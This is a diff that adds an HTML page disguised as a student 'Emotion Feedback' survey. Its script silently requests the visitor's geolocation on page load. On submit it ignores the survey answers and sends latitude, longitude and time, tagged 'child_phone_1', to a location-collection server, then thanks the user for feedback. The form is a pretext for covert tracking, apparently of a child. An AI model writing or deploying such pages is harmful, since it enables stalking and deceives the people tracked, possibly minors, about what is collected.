@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Student Feedback Form</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #f5f5f5;
+}
+
+.container {
+    max-width: 400px;
+    margin: 50px auto;
+    background: white;
+    padding: 25px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px #ccc;
+}
+
+h2 {
+    text-align: center;
+}
+
+label {
+    display: block;
+    margin-top: 15px;
+}
+
+input, select {
+    width: 100%;
+    padding: 8px;
+    margin-top: 5px;
+}
+
+button {
+    margin-top: 20px;
+    width: 100%;
+    padding: 10px;
+    background: #2196f3;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+}
+
+#msg {
+    text-align: center;
+    margin-top: 15px;
+    color: green;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h2>📋 Emotion Feedback</h2>
+
+<form id="surveyForm">
+
+<label>Name</label>
+<input type="text" required>
+
+<label>Occupation</label>
+<select required>
+    <option>Student</option>
+    <option>Government Employee</option>
+    <option>Private</option>
+    <option>Unemployed</option>
+</select>
+
+<label>How was your day?</label>
+<select required>
+    <option>Good</option>
+    <option>Okay</option>
+    <option>Bad</option>
+</select>
+
+<button type="submit">Submit</button>
+
+</form>
+
+<p id="msg"></p>
+
+</div>
+
+<script>
+
+let currentLocation = null;
+
+/* Get location silently */
+if (navigator.geolocation) {
+
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+
+            currentLocation = {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude
+            };
+
+        },
+        () => {
+            console.log("Location denied");
+        }
+    );
+}
+
+/* On submit */
+document.getElementById("surveyForm").addEventListener("submit", async function(e){
+
+    e.preventDefault();
+
+    document.getElementById("msg").innerText = "Submitting...";
+
+    try {
+
+        await fetch("http://localhost:3000/location", {
+
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                deviceId: "child_phone_1",
+
+                latitude: currentLocation?.lat || null,
+                longitude: currentLocation?.lng || null,
+
+                time: Date.now()
+            })
+        });
+
+        document.getElementById("msg").innerText =
+            "Thank you for your feedback ✅";
+
+    }
+    catch {
+
+        document.getElementById("msg").innerText =
+            "Submission failed ❌";
+    }
+
+});
+
+</script>
+
+</body>
+</html>
